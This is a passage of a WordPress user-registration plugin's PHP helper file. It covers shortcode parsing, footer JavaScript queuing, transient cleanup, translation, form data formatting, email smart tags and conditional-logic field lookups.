| [1742](#L1742) | if ( isset( $field->field\_key ) && 'date' === $field->field\_key ) { |
| [1743](#L1743) | return true; |
| [1744](#L1744) | } |
| [1745](#L1745) | } |
| [1746](#L1746) | } |
| [1747](#L1747) | } |
| [1748](#L1748) | } |
| [1749](#L1749) |  |
| [1750](#L1750) | return false; |
| [1751](#L1751) | } |
| [1752](#L1752) |  |
| [1753](#L1753) | /\*\* |
| [1754](#L1754) | \* Get attributes from the shortcode content. |
| [1755](#L1755) | \* |
| [1756](#L1756) | \* @param  string $content     Shortcode content. |
| [1757](#L1757) | \* @return array        Array of attributes within the shortcode. |
| [1758](#L1758) | \* |
| [1759](#L1759) | \* @since  1.6.0 |
| [1760](#L1760) | \*/ |
| [1761](#L1761) | function ur\_get\_shortcode\_attr( $content ) { |
| [1762](#L1762) | $pattern = get\_shortcode\_regex(); |
| [1763](#L1763) |  |
| [1764](#L1764) | $keys   = array(); |
| [1765](#L1765) | $result = array(); |
| [1766](#L1766) |  |
| [1767](#L1767) | if ( preg\_match\_all( '/' . $pattern . '/s', $content, $matches ) ) { |
| [1768](#L1768) |  |
| [1769](#L1769) | foreach ( $matches[0] as $key => $value ) { |
| [1770](#L1770) |  |
| [1771](#L1771) | // $matches[ 3 ] return the shortcode attribute as string. |
| [1772](#L1772) | // replace space with '&' for parse\_str() function. |
| [1773](#L1773) | $get = str\_replace( ' ', '&', $matches[3][ $key ] ); |
| [1774](#L1774) | parse\_str( $get, $output ); |
| [1775](#L1775) |  |
| [1776](#L1776) | // Get all shortcode attribute keys. |
| [1777](#L1777) | $keys     = array\_unique( array\_merge( $keys, array\_keys( $output ) ) ); |
| [1778](#L1778) | $result[] = $output; |
| [1779](#L1779) | } |
| [1780](#L1780) |  |
| [1781](#L1781) | if ( $keys && $result ) { |
| [1782](#L1782) |  |
| [1783](#L1783) | // Loop the result array and add the missing shortcode attribute key. |
| [1784](#L1784) | foreach ( $result as $key => $value ) { |
| [1785](#L1785) |  |
| [1786](#L1786) | // Loop the shortcode attribute key. |
| [1787](#L1787) | foreach ( $keys as $attr\_key ) { |
| [1788](#L1788) | $result[ $key ][ $attr\_key ] = isset( $result[ $key ][ $attr\_key ] ) ? $result[ $key ][ $attr\_key ] : null; |
| [1789](#L1789) | } |
| [1790](#L1790) |  |
| [1791](#L1791) | // Sort the array key. |
| [1792](#L1792) | ksort( $result[ $key ] ); |
| [1793](#L1793) | } |
| [1794](#L1794) | } |
| [1795](#L1795) | } |
| [1796](#L1796) |  |
| [1797](#L1797) | return $result; |
| [1798](#L1798) | } |
| [1799](#L1799) |  |
| [1800](#L1800) | /\*\* |
| [1801](#L1801) | \* Print js script by properly sanitizing and escaping. |
| [1802](#L1802) | \* |
| [1803](#L1803) | \* @since 1.1.2 |
| [1804](#L1804) | \* Output any queued javascript code in the footer. |
| [1805](#L1805) | \*/ |
| [1806](#L1806) | function ur\_print\_js() { |
| [1807](#L1807) | global $ur\_queued\_js; |
| [1808](#L1808) |  |
| [1809](#L1809) | if ( ! empty( $ur\_queued\_js ) ) { |
| [1810](#L1810) | // Sanitize. |
| [1811](#L1811) | $ur\_queued\_js = wp\_check\_invalid\_utf8( $ur\_queued\_js ); |
| [1812](#L1812) | $ur\_queued\_js = preg\_replace( '/&#(x)?0\*(?(1)27|39);?/i', "'", $ur\_queued\_js ); |
| [1813](#L1813) | $ur\_queued\_js = str\_replace( "\r", '', $ur\_queued\_js ); |
| [1814](#L1814) |  |
| [1815](#L1815) | $js = "<!-- User Registration JavaScript -->\n<script type=\"text/javascript\">\njQuery(function($) { $ur\_queued\_js });\n</script>\n"; |
| [1816](#L1816) |  |
| [1817](#L1817) | /\*\* |
| [1818](#L1818) | \* User Registration js filter. |
| [1819](#L1819) | \* |
| [1820](#L1820) | \* @param string $js JavaScript code. |
| [1821](#L1821) | \*/ |
| [1822](#L1822) | echo wp\_kses( apply\_filters( 'user\_registration\_queued\_js', $js ), array( 'script' => array( 'type' => true ) ) ); |
| [1823](#L1823) |  |
| [1824](#L1824) | unset( $ur\_queued\_js ); |
| [1825](#L1825) | } |
| [1826](#L1826) | } |
| [1827](#L1827) | /\*\* |
| [1828](#L1828) | \* Enqueue UR js. |
| [1829](#L1829) | \* |
| [1830](#L1830) | \* @since 1.1.2 |
| [1831](#L1831) | \* Queue some JavaScript code to be output in the footer. |
| [1832](#L1832) | \* |
| [1833](#L1833) | \* @param string $code Code to enqueue. |
| [1834](#L1834) | \*/ |
| [1835](#L1835) | function ur\_enqueue\_js( $code ) { |
| [1836](#L1836) | global $ur\_queued\_js; |
| [1837](#L1837) |  |
| [1838](#L1838) | if ( empty( $ur\_queued\_js ) ) { |
| [1839](#L1839) | $ur\_queued\_js = ''; |
| [1840](#L1840) | } |
| [1841](#L1841) |  |
| [1842](#L1842) | $ur\_queued\_js .= "\n" . $code . "\n"; |
| [1843](#L1843) | } |
| [1844](#L1844) |  |
| [1845](#L1845) | /\*\* |
| [1846](#L1846) | \* Delete expired transients. |
| [1847](#L1847) | \* |
| [1848](#L1848) | \* Deletes all expired transients. The multi-table delete syntax is used. |
| [1849](#L1849) | \* to delete the transient record from table a, and the corresponding. |
| [1850](#L1850) | \* transient\_timeout record from table b. |
| [1851](#L1851) | \* |
| [1852](#L1852) | \* Based on code inside core's upgrade\_network() function. |
| [1853](#L1853) | \* |
| [1854](#L1854) | \* @since  1.2.0 |
| [1855](#L1855) | \* @return int Number of transients that were cleared. |
| [1856](#L1856) | \*/ |
| [1857](#L1857) | function ur\_delete\_expired\_transients() { |
| [1858](#L1858) | global $wpdb; |
| [1859](#L1859) |  |
| [1860](#L1860) | $sql  = "DELETE a, b FROM $wpdb->options a, $wpdb->options b |
| [1861](#L1861) | WHERE a.option\_name LIKE %s |
| [1862](#L1862) | AND a.option\_name NOT LIKE %s |
| [1863](#L1863) | AND b.option\_name = CONCAT( '\_transient\_timeout\_', SUBSTRING( a.option\_name, 12 ) ) |
| [1864](#L1864) | AND b.option\_value < %d"; |
| [1865](#L1865) | $rows = $wpdb->query( $wpdb->prepare( $sql, $wpdb->esc\_like( '\_transient\_' ) . '%', $wpdb->esc\_like( '\_transient\_timeout\_' ) . '%', time() ) ); // WPCS: unprepared SQL ok. |
| [1866](#L1866) |  |
| [1867](#L1867) | $sql   = "DELETE a, b FROM $wpdb->options a, $wpdb->options b |
| [1868](#L1868) | WHERE a.option\_name LIKE %s |
| [1869](#L1869) | AND a.option\_name NOT LIKE %s |
| [1870](#L1870) | AND b.option\_name = CONCAT( '\_site\_transient\_timeout\_', SUBSTRING( a.option\_name, 17 ) ) |
| [1871](#L1871) | AND b.option\_value < %d"; |
| [1872](#L1872) | $rows2 = $wpdb->query( $wpdb->prepare( $sql, $wpdb->esc\_like( '\_site\_transient\_' ) . '%', $wpdb->esc\_like( '\_site\_transient\_timeout\_' ) . '%', time() ) ); // WPCS: unprepared SQL ok. |
| [1873](#L1873) |  |
| [1874](#L1874) | return absint( $rows + $rows2 ); |
| [1875](#L1875) | } |
| [1876](#L1876) | add\_action( 'user\_registration\_installed', 'ur\_delete\_expired\_transients' ); |
| [1877](#L1877) |  |
| [1878](#L1878) | /\*\* |
| [1879](#L1879) | \* String translation function. |
| [1880](#L1880) | \* |
| [1881](#L1881) | \* @since 1.7.3 |
| [1882](#L1882) | \* |
| [1883](#L1883) | \* @param int    $form\_id Form ID. |
| [1884](#L1884) | \* @param string $field\_id Field ID. |
| [1885](#L1885) | \* @param mixed  $variable To be translated for WPML compatibility. |
| [1886](#L1886) | \*/ |
| [1887](#L1887) | function ur\_string\_translation( $form\_id, $field\_id, $variable ) { |
| [1888](#L1888) | if ( function\_exists( 'icl\_register\_string' ) ) { |
| [1889](#L1889) | icl\_register\_string( isset( $form\_id ) && 0 !== $form\_id ? 'user\_registration\_' . absint( $form\_id ) : 'user-registration', isset( $field\_id ) ? $field\_id : '', $variable ); |
| [1890](#L1890) | } |
| [1891](#L1891) | if ( function\_exists( 'icl\_t' ) ) { |
| [1892](#L1892) | $variable = icl\_t( isset( $form\_id ) && 0 !== $form\_id ? 'user\_registration\_' . absint( $form\_id ) : 'user-registration', isset( $field\_id ) ? $field\_id : '', $variable ); |
| [1893](#L1893) | } |
| [1894](#L1894) | return $variable; |
| [1895](#L1895) | } |
| [1896](#L1896) |  |
| [1897](#L1897) | /\*\* |
| [1898](#L1898) | \* Get Form ID from User ID. |
| [1899](#L1899) | \* |
| [1900](#L1900) | \* @param int $user\_id User ID. |
| [1901](#L1901) | \* |
| [1902](#L1902) | \* @return int $form\_id Form ID. |
| [1903](#L1903) | \*/ |
| [1904](#L1904) | function ur\_get\_form\_id\_by\_userid( $user\_id ) { |
| [1905](#L1905) | $form\_id\_array = get\_user\_meta( $user\_id, 'ur\_form\_id' ); |
| [1906](#L1906) | $form\_id       = 0; |
| [1907](#L1907) |  |
| [1908](#L1908) | if ( isset( $form\_id\_array[0] ) ) { |
| [1909](#L1909) | $form\_id = $form\_id\_array[0]; |
| [1910](#L1910) | } |
| [1911](#L1911) | return $form\_id; |
| [1912](#L1912) | } |
| [1913](#L1913) |  |
| [1914](#L1914) | /\*\* |
| [1915](#L1915) | \* Get source ID through which the given user was supposedly registered. |
| [1916](#L1916) | \* |
| [1917](#L1917) | \* @since 1.9.0 |
| [1918](#L1918) | \* |
| [1919](#L1919) | \* @param int $user\_id User ID. |
| [1920](#L1920) | \* |
| [1921](#L1921) | \* @return mixed |
| [1922](#L1922) | \*/ |
| [1923](#L1923) | function ur\_get\_registration\_source\_id( $user\_id ) { |
| [1924](#L1924) | $user\_metas = get\_user\_meta( $user\_id ); |
| [1925](#L1925) |  |
| [1926](#L1926) | if ( isset( $user\_metas['user\_registration\_social\_connect\_bypass\_current\_password'] ) ) { |
| [1927](#L1927) | $networks = array( 'facebook', 'linkedin', 'google', 'twitter' ); |
| [1928](#L1928) |  |
| [1929](#L1929) | foreach ( $networks as $network ) { |
| [1930](#L1930) |  |
| [1931](#L1931) | if ( isset( $user\_metas[ 'user\_registration\_social\_connect\_' . $network . '\_username' ] ) ) { |
| [1932](#L1932) | return $network; |
| [1933](#L1933) | } |
| [1934](#L1934) | } |
| [1935](#L1935) | } elseif ( isset( $user\_metas['ur\_form\_id'] ) ) { |
| [1936](#L1936) | return $user\_metas['ur\_form\_id'][0]; |
| [1937](#L1937) | } else { |
| [1938](#L1938) | return null; |
| [1939](#L1939) | } |
| [1940](#L1940) | } |
| [1941](#L1941) |  |
| [1942](#L1942) | /\*\* |
| [1943](#L1943) | \* Check if a datetime falls in a range of time. |
| [1944](#L1944) | \* |
| [1945](#L1945) | \* @since 1.9.0 |
| [1946](#L1946) | \* |
| [1947](#L1947) | \* @param string      $target\_date Target date. |
| [1948](#L1948) | \* @param string|null $start\_date Start date. |
| [1949](#L1949) | \* @param string|null $end\_date End date. |
| [1950](#L1950) | \* |
| [1951](#L1951) | \* @return bool |
| [1952](#L1952) | \*/ |
| [1953](#L1953) | function ur\_falls\_in\_date\_range( $target\_date, $start\_date = null, $end\_date = null ) { |
| [1954](#L1954) | $start\_ts       = strtotime( $start\_date ); |
| [1955](#L1955) | $end\_ts         = strtotime( $end\_date . ' +1 Day' ); |
| [1956](#L1956) | $target\_date\_ts = strtotime( $target\_date ); |
| [1957](#L1957) |  |
| [1958](#L1958) | // If the starting and the ending date are set as same. |
| [1959](#L1959) | if ( $start\_ts === $end\_ts ) { |
| [1960](#L1960) | $datetime = new DateTime(); |
| [1961](#L1961) | $datetime->setTimestamp( $end\_ts ); |
| [1962](#L1962) |  |
| [1963](#L1963) | date\_add( $datetime, date\_interval\_create\_from\_date\_string( '23 hours 59 mins 59 secs' ) ); |
| [1964](#L1964) | $end\_ts = $datetime->getTimestamp(); |
| [1965](#L1965) | } |
| [1966](#L1966) |  |
| [1967](#L1967) | if ( $start\_date && $end\_date ) { |
| [1968](#L1968) | return ( $start\_ts <= $target\_date\_ts ) && ( $target\_date\_ts <= $end\_ts ); |
| [1969](#L1969) | } elseif ( $start\_date ) { |
| [1970](#L1970) | return ( $start\_ts <= $target\_date\_ts ); |
| [1971](#L1971) | } elseif ( $end\_date ) { |
| [1972](#L1972) | return ( $target\_date\_ts <= $end\_ts ); |
| [1973](#L1973) | } else { |
| [1974](#L1974) | return false; |
| [1975](#L1975) | } |
| [1976](#L1976) | } |
| [1977](#L1977) |  |
| [1978](#L1978) | /\*\* |
| [1979](#L1979) | \* Get Post Content By Form ID. |
| [1980](#L1980) | \* |
| [1981](#L1981) | \* @param int $form\_id Form Id. |
| [1982](#L1982) | \* |
| [1983](#L1983) | \* @return array|mixed|null|object |
| [1984](#L1984) | \*/ |
| [1985](#L1985) | function ur\_get\_post\_content( $form\_id ) { |
| [1986](#L1986) |  |
| [1987](#L1987) | $args      = array( |
| [1988](#L1988) | 'post\_type'   => 'user\_registration', |
| [1989](#L1989) |  |
| [1990](#L1990) | 'post\_status' => 'publish', |
| [1991](#L1991) |  |
| [1992](#L1992) | 'post\_\_in'    => array( $form\_id ), |
| [1993](#L1993) | ); |
| [1994](#L1994) | $post\_data = get\_posts( $args ); |
| [1995](#L1995) |  |
| [1996](#L1996) | if ( isset( $post\_data[0]->post\_content ) ) { |
| [1997](#L1997) |  |
| [1998](#L1998) | return json\_decode( $post\_data[0]->post\_content ); |
| [1999](#L1999) |  |
| [2000](#L2000) | } else { |
| [2001](#L2001) |  |
| [2002](#L2002) | return array(); |
| [2003](#L2003) | } |
| [2004](#L2004) | } |
| [2005](#L2005) |  |
| [2006](#L2006) | /\*\* |
| [2007](#L2007) | \* A wp\_parse\_args() for multi-dimensional array. |
| [2008](#L2008) | \* |
| [2009](#L2009) | \* @see https://developer.wordpress.org/reference/functions/wp\_parse\_args/ |
| [2010](#L2010) | \* |
| [2011](#L2011) | \* @since 1.9.0 |
| [2012](#L2012) | \* |
| [2013](#L2013) | \* @param array $args       Value to merge with $defaults. |
| [2014](#L2014) | \* @param array $defaults   Array that serves as the defaults. |
| [2015](#L2015) | \* |
| [2016](#L2016) | \* @return array    Merged user defined values with defaults. |
| [2017](#L2017) | \*/ |
| [2018](#L2018) | function ur\_parse\_args( &$args, $defaults ) { |
| [2019](#L2019) | $args     = (array) $args; |
| [2020](#L2020) | $defaults = (array) $defaults; |
| [2021](#L2021) | $result   = $defaults; |
| [2022](#L2022) | foreach ( $args as $k => &$v ) { |
| [2023](#L2023) | if ( is\_array( $v ) && isset( $result[ $k ] ) ) { |
| [2024](#L2024) | $result[ $k ] = ur\_parse\_args( $v, $result[ $k ] ); |
| [2025](#L2025) | } else { |
| [2026](#L2026) | $result[ $k ] = $v; |
| [2027](#L2027) | } |
| [2028](#L2028) | } |
| [2029](#L2029) | return $result; |
| [2030](#L2030) | } |
| [2031](#L2031) |  |
| [2032](#L2032) | /\*\* |
| [2033](#L2033) | \* Override email content for specific form. |
| [2034](#L2034) | \* |
| [2035](#L2035) | \* @param int    $form\_id Form Id. |
| [2036](#L2036) | \* @param object $settings Settings for specific email. |
| [2037](#L2037) | \* @param string $message Message to be sent in email body. |
| [2038](#L2038) | \* @param string $subject Subject of the email. |
| [2039](#L2039) | \* |
| [2040](#L2040) | \* @return array |
| [2041](#L2041) | \*/ |
| [2042](#L2042) | function user\_registration\_email\_content\_overrider( $form\_id, $settings, $message, $subject ) { |
| [2043](#L2043) | // Check if email templates addon is active. |
| [2044](#L2044) | if ( class\_exists( 'User\_Registration\_Email\_Templates' ) ) { |
| [2045](#L2045) | $email\_content\_override = ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_email\_content\_override', '' ); |
| [2046](#L2046) |  |
| [2047](#L2047) | // Check if the post meta exists and have contents. |
| [2048](#L2048) | if ( $email\_content\_override ) { |
| [2049](#L2049) |  |
| [2050](#L2050) | $auto\_password\_template\_overrider = isset( $email\_content\_override[ $settings->id ] ) ? $email\_content\_override[ $settings->id ] : ''; |
| [2051](#L2051) |  |
| [2052](#L2052) | // Check if the email override is enabled. |
| [2053](#L2053) | if ( '' !== $auto\_password\_template\_overrider && ur\_string\_to\_bool( $auto\_password\_template\_overrider['override'] ) ) { |
| [2054](#L2054) | $message = $auto\_password\_template\_overrider['content']; |
| [2055](#L2055) | $subject = $auto\_password\_template\_overrider['subject']; |
| [2056](#L2056) | } |
| [2057](#L2057) | } |
| [2058](#L2058) | } |
| [2059](#L2059) | return array( $message, $subject ); |
| [2060](#L2060) | } |
| [2061](#L2061) |  |
| [2062](#L2062) | /\*\* Get User Data in particular array format. |
| [2063](#L2063) | \* |
| [2064](#L2064) | \* @param string $new\_string Field Key. |
| [2065](#L2065) | \* @param string $post\_key Post Key. |
| [2066](#L2066) | \* @param array  $profile Form Data. |
| [2067](#L2067) | \* @param mixed  $value Value. |
| [2068](#L2068) | \*/ |
| [2069](#L2069) | function ur\_get\_valid\_form\_data\_format( $new\_string, $post\_key, $profile, $value ) { |
| [2070](#L2070) | $valid\_form\_data = array(); |
| [2071](#L2071) | if ( isset( $profile[ $post\_key ] ) ) { |
| [2072](#L2072) | $field\_type = $profile[ $post\_key ]['type']; |
| [2073](#L2073) |  |
| [2074](#L2074) | switch ( $field\_type ) { |
| [2075](#L2075) | case 'checkbox': |
| [2076](#L2076) | case 'multi\_select2': |
| [2077](#L2077) | if ( ! is\_array( $value ) && ! empty( $value ) ) { |
| [2078](#L2078) | $value = maybe\_unserialize( $value ); |
| [2079](#L2079) | } |
| [2080](#L2080) | break; |
| [2081](#L2081) | case 'file': |
| [2082](#L2082) | $files = is\_array( $value ) ? $value : explode( ',', $value ); |
| [2083](#L2083) |  |
| [2084](#L2084) | if ( is\_array( $files ) && isset( $files[0] ) ) { |
| [2085](#L2085) | $attachment\_ids = ''; |
| [2086](#L2086) |  |
| [2087](#L2087) | foreach ( $files as $key => $file ) { |
| [2088](#L2088) | $seperator = 0 < $key ? ',' : ''; |
| [2089](#L2089) |  |
| [2090](#L2090) | if ( wp\_http\_validate\_url( $file ) ) { |
| [2091](#L2091) |  |
| [2092](#L2092) | $attachment\_ids = $attachment\_ids . '' . $seperator . '' . attachment\_url\_to\_postid( $file ); |
| [2093](#L2093) | } |
| [2094](#L2094) | } |
| [2095](#L2095) | $value = ! empty( $attachment\_ids ) ? $attachment\_ids : $value; |
| [2096](#L2096) | } else { |
| [2097](#L2097) |  |
| [2098](#L2098) | if ( wp\_http\_validate\_url( $value ) ) { |
| [2099](#L2099) | $value = attachment\_url\_to\_postid( $value ); |
| [2100](#L2100) | } |
| [2101](#L2101) | } |
| [2102](#L2102) | break; |
| [2103](#L2103) | } |
| [2104](#L2104) | $valid\_form\_data[ $new\_string ]               = new stdClass(); |
| [2105](#L2105) | $valid\_form\_data[ $new\_string ]->field\_name   = $new\_string; |
| [2106](#L2106) | $valid\_form\_data[ $new\_string ]->value        = $value; |
| [2107](#L2107) | $valid\_form\_data[ $new\_string ]->field\_type   = $profile[ $post\_key ]['type']; |
| [2108](#L2108) | $valid\_form\_data[ $new\_string ]->label        = $profile[ $post\_key ]['label']; |
| [2109](#L2109) | $valid\_form\_data[ $new\_string ]->extra\_params = array( |
| [2110](#L2110) | 'field\_key' => $profile[ $post\_key ]['field\_key'], |
| [2111](#L2111) | 'label'     => $profile[ $post\_key ]['label'], |
| [2112](#L2112) | ); |
| [2113](#L2113) | } else { |
| [2114](#L2114) | $valid\_form\_data[ $new\_string ]               = new stdClass(); |
| [2115](#L2115) | $valid\_form\_data[ $new\_string ]->field\_name   = $new\_string; |
| [2116](#L2116) | $valid\_form\_data[ $new\_string ]->value        = $value; |
| [2117](#L2117) | $valid\_form\_data[ $new\_string ]->extra\_params = array( |
| [2118](#L2118) | 'field\_key' => $new\_string, |
| [2119](#L2119) | ); |
| [2120](#L2120) | } |
| [2121](#L2121) | return $valid\_form\_data; |
| [2122](#L2122) | } |
| [2123](#L2123) |  |
| [2124](#L2124) | /\*\* |
| [2125](#L2125) | \* Add our login and my account shortcodes to conflicting shortcodes filter of All In One Seo plugin to resolve the conflict |
| [2126](#L2126) | \* |
| [2127](#L2127) | \* @param array $conflict\_shortcodes Array of shortcodes that All in one Seo is conflicting with. |
| [2128](#L2128) | \* |
| [2129](#L2129) | \* @since 1.9.4 |
| [2130](#L2130) | \*/ |
| [2131](#L2131) | function ur\_resolve\_conflicting\_shortcodes\_with\_aioseo( $conflict\_shortcodes ) { |
| [2132](#L2132) | $ur\_shortcodes = array( |
| [2133](#L2133) | 'User Registration My Account' => '[user\_registration\_my\_account]', |
| [2134](#L2134) | 'User Registration Login'      => '[user\_registration\_login]', |
| [2135](#L2135) | ); |
| [2136](#L2136) |  |
| [2137](#L2137) | $conflict\_shortcodes = array\_merge( $conflict\_shortcodes, $ur\_shortcodes ); |
| [2138](#L2138) | return $conflict\_shortcodes; |
| [2139](#L2139) | } |
| [2140](#L2140) |  |
| [2141](#L2141) | add\_filter( 'aioseo\_conflicting\_shortcodes', 'ur\_resolve\_conflicting\_shortcodes\_with\_aioseo' ); |
| [2142](#L2142) |  |
| [2143](#L2143) | /\*\* |
| [2144](#L2144) | \* Parse name values and smart tags |
| [2145](#L2145) | \* |
| [2146](#L2146) | \* @param  int   $user\_id User ID. |
| [2147](#L2147) | \* @param  int   $form\_id Form ID. |
| [2148](#L2148) | \* @param  array $valid\_form\_data Form filled data. |
| [2149](#L2149) | \* |
| [2150](#L2150) | \* @since 1.9.6 |
| [2151](#L2151) | \* |
| [2152](#L2152) | \* @return array |
| [2153](#L2153) | \*/ |
| [2154](#L2154) | function ur\_parse\_name\_values\_for\_smart\_tags( $user\_id, $form\_id, $valid\_form\_data ) { |
| [2155](#L2155) |  |
| [2156](#L2156) | $name\_value = array(); |
| [2157](#L2157) | $data\_html  = '<table class="user-registration-email\_\_entries" cellpadding="0" cellspacing="0"><tbody>'; |
| [2158](#L2158) |  |
| [2159](#L2159) | // Generate $data\_html string to replace for {{all\_fields}} smart tag. |
| [2160](#L2160) | foreach ( $valid\_form\_data as $field\_meta => $form\_data ) { |
| [2161](#L2161) |  |
| [2162](#L2162) | if ( 'user\_confirm\_password' === $field\_meta || 'user\_pass' === $field\_meta || preg\_match( '/password\_/', $field\_meta ) ) { |
| [2163](#L2163) | continue; |
| [2164](#L2164) | } |
| [2165](#L2165) |  |
| [2166](#L2166) | // Donot include privacy policy value. |
| [2167](#L2167) | if ( isset( $form\_data->extra\_params['field\_key'] ) && 'privacy\_policy' === $form\_data->extra\_params['field\_key'] ) { |
| [2168](#L2168) | continue; |
| [2169](#L2169) | } |
| [2170](#L2170) |  |
| [2171](#L2171) | if ( isset( $form\_data->extra\_params['field\_key'] ) && 'country' === $form\_data->extra\_params['field\_key'] && '' !== $form\_data->value ) { |
| [2172](#L2172) | $country\_class    = ur\_load\_form\_field\_class( $form\_data->extra\_params['field\_key'] ); |
| [2173](#L2173) | $countries        = $country\_class::get\_instance()->get\_country(); |
| [2174](#L2174) | $form\_data->value = isset( $countries[ $form\_data->value ] ) ? $countries[ $form\_data->value ] : $form\_data->value; |
| [2175](#L2175) | } |
| [2176](#L2176) |  |
| [2177](#L2177) | $label      = isset( $form\_data->extra\_params['label'] ) ? $form\_data->extra\_params['label'] : ''; |
| [2178](#L2178) | $field\_name = isset( $form\_data->field\_name ) ? $form\_data->field\_name : ''; |
| [2179](#L2179) | $value      = isset( $form\_data->value ) ? $form\_data->value : ''; |
| [2180](#L2180) |  |
| [2181](#L2181) | if ( 'user\_pass' === $field\_meta ) { |
| [2182](#L2182) | $value = \_\_( 'Chosen Password', 'user-registration' ); |
| [2183](#L2183) | } |
| [2184](#L2184) |  |
| [2185](#L2185) | // Check if value contains array. |
| [2186](#L2186) | if ( is\_array( $value ) ) { |
| [2187](#L2187) | $value = implode( ',', $value ); |
| [2188](#L2188) | } |
| [2189](#L2189) |  |
| [2190](#L2190) | $data\_html .= '<tr><td>' . $label . ' : </td><td>' . $value . '</td></tr>'; |
| [2191](#L2191) |  |
| [2192](#L2192) | $name\_value[ $field\_name ] = $value; |
| [2193](#L2193) | } |
| [2194](#L2194) |  |
| [2195](#L2195) | $data\_html .= '</tbody></table>'; |
| [2196](#L2196) |  |
| [2197](#L2197) | // Smart tag process for extra fields. |
| [2198](#L2198) | $name\_value = apply\_filters( 'user\_registration\_process\_smart\_tag', $name\_value, $valid\_form\_data, $form\_id, $user\_id ); |
| [2199](#L2199) |  |
| [2200](#L2200) | return array( $name\_value, $data\_html ); |
| [2201](#L2201) | } |
| [2202](#L2202) |  |
| [2203](#L2203) | /\*\* |
| [2204](#L2204) | \* Get field data by field\_name. |
| [2205](#L2205) | \* |
| [2206](#L2206) | \* @param int    $form\_id Form Id. |
| [2207](#L2207) | \* @param string $field\_name Field Name. |
| [2208](#L2208) | \* |
| [2209](#L2209) | \* @return array |
| [2210](#L2210) | \*/ |
| [2211](#L2211) | function ur\_get\_field\_data\_by\_field\_name( $form\_id, $field\_name ) { |
| [2212](#L2212) | $field\_data = array(); |
| [2213](#L2213) |  |
| [2214](#L2214) | $post\_content\_array = ( $form\_id ) ? UR()->form->get\_form( $form\_id, array( 'content\_only' => true ) ) : array(); |
| [2215](#L2215) |  |
| [2216](#L2216) | foreach ( $post\_content\_array as $post\_content\_row ) { |
| [2217](#L2217) | foreach ( $post\_content\_row as $post\_content\_grid ) { |
| [2218](#L2218) | if ( is\_array( $post\_content\_grid ) || is\_object( $post\_content\_grid ) ) { |
| [2219](#L2219) | foreach ( $post\_content\_grid as $field ) { |
| [2220](#L2220) | if ( isset( $field->field\_key ) && isset( $field->general\_setting->field\_name ) && $field->general\_setting->field\_name === $field\_name ) { |
| [2221](#L2221) | $field\_data = array( |
| [2222](#L2222) | 'field\_key'       => $field->field\_key, |
| [2223](#L2223) | 'general\_setting' => $field->general\_setting, |
| [2224](#L2224) | 'advance\_setting' => $field->advance\_setting, |
| [2225](#L2225) | ); |
| [2226](#L2226) | } |
| [2227](#L2227) | } |
| [2228](#L2228) | } |
| [2229](#L2229) | } |
| [2230](#L2230) | } |
| [2231](#L2231) | return $field\_data; |
| [2232](#L2232) | } |
| [2233](#L2233) |  |
| [2234](#L2234) | if ( ! function\_exists( 'user\_registration\_pro\_get\_conditional\_fields\_by\_form\_id' ) ) { |
| [2235](#L2235) | /\*\* |
| [2236](#L2236) | \* Get form fields by form id |
| [2237](#L2237) | \* |
| [2238](#L2238) | \* @param int    $form\_id Form ID. |
| [2239](#L2239) | \* @param string $selected\_field\_key Field Key. |
| [2240](#L2240) | \*/ |
| [2241](#L2241) | function user\_registration\_pro\_get\_conditional\_fields\_by\_form\_id( $form\_id, $selected\_field\_key ) { |
| [2242](#L2242) | $args          = array( |
| [2243](#L2243) | 'post\_type'   => 'user\_registration', |
| [2244](#L2244) | 'post\_status' => 'publish', |
| [2245](#L2245) | 'post\_\_in'    => array( $form\_id ), |
| [2246](#L2246) | ); |
| [2247](#L2247) | $post\_data = get\_posts( $args ); |
| [2248](#L2248) | // wrap all fields in array. |
| [2249](#L2249) | $fields = array(); |
| [2250](#L2250) | if ( isset( $post\_data[0]->post\_content ) ) { |
| [2251](#L2251) | $post\_content\_array = json\_decode( $post\_data[0]->post\_content ); |
| [2252](#L2252) |  |
| [2253](#L2253) | if ( ! is\_null( $post\_content\_array ) ) { |
| [2254](#L2254) | foreach ( $post\_content\_array as $data ) { |
| [2255](#L2255) | foreach ( $data as $single\_data ) { |
| [2256](#L2256) | foreach ( $single\_data as $field\_data ) { |
| [2257](#L2257) | if ( isset( $field\_data->general\_setting->field\_name ) |
| [2258](#L2258) | && isset( $field\_data->general\_setting->label ) ) { |
| [2259](#L2259) |  |
| [2260](#L2260) | $strip\_fields = array( |
| [2261](#L2261) | 'section\_title', |
| [2262](#L2262) | 'html', |
| [2263](#L2263) | 'wysiwyg', |
| [2264](#L2264) | 'billing\_address\_title', |
| [2265](#L2265) | 'shipping\_address\_title', |
| [2266](#L2266) | 'stripe\_gateway', |
| [2267](#L2267) | 'profile\_picture', |
| [2268](#L2268) | 'file', |
| [2269](#L2269) | ); |
| [2270](#L2270) |  |
| [2271](#L2271) | if ( in\_array( $field\_data->field\_key, $strip\_fields, true ) ) { |
| [2272](#L2272) | continue; |
| [2273](#L2273) | } |
| [2274](#L2274) |  |
| [2275](#L2275) | $fields[ $field\_data->general\_setting->field\_name ] = array( |
| [2276](#L2276) | 'label'     => $field\_data->general\_setting->label, |
| [2277](#L2277) | 'field\_key' => $field\_data->field\_key, |
| [2278](#L2278) | ); |
| [2279](#L2279) | } |
| [2280](#L2280) | } |
| [2281](#L2281) | } |
| [2282](#L2282) | } |
| [2283](#L2283) | } |
| [2284](#L2284) | } |
| [2285](#L2285) | // Unset selected meta key. |
| [2286](#L2286) | unset( $fields[ $selected\_field\_key ] ); |
| [2287](#L2287) | return $fields; |
| [2288](#L2288) | } |
| [2289](#L2289) | } |
| [2290](#L2290) |  |
| [2291](#L2291) | if ( ! function\_exists( 'user\_registration\_pro\_render\_conditional\_logic' ) ) { |
| [2292](#L2292) | /\*\* |
| [2293](#L2293) | \* Render Conditional Logic in form settings of form builder. |
| [2294](#L2294) | \* |
| [2295](#L2295) | \* @param array  $connection Connection Data. |
| [2296](#L2296) | \* @param string $integration Integration. |
| [2297](#L2297) | \* @param int    $form\_id Form ID. |
| [2298](#L2298) | \* @return string |
| [2299](#L2299) | \*/ |
| [2300](#L2300) | function user\_registration\_pro\_render\_conditional\_logic( $connection, $integration, $form\_id ) { |
| [2301](#L2301) | $output  = '<div class="ur\_conditional\_logic\_container">'; |
| [2302](#L2302) | $output .= '<h4>' . esc\_html\_\_( 'Conditional Logic', 'user-registration' ) . '</h4>'; |
| [2303](#L2303) | $output .= '<div class="ur\_use\_conditional\_logic\_wrapper ur-check">'; |
| [2304](#L2304) | $checked = ''; |
| [2305](#L2305) |  |
